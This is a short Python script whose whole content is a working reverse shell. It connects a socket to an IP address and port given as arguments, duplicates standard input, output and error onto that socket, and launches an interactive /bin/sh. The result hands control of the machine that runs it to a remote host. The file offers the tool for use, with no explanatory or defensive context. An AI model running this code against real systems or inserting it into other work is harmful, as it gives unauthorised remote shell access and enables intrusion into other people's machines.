import os
import socket
import subprocess
import argparse

def spawn_reverse_shell(ip, port):
	shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	shell_socket.connect((ip, int(port)))
	os.dup2(shell_socket.fileno(),0)
	os.dup2(shell_socket.fileno(),1)
	os.dup2(shell_socket.fileno(),2)
	subprocess.call(['/bin/sh','-i'])
	
	
def argument_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--ip", required=True)
    parser.add_argument("-p", "--port", required=True)
    return parser.parse_args()
    
    
def main():
    args = argument_parser()    
    ip = args.ip
    port = args.port
    spawn_reverse_shell(ip, port)


if __name__== "__main__" :
    main()
 
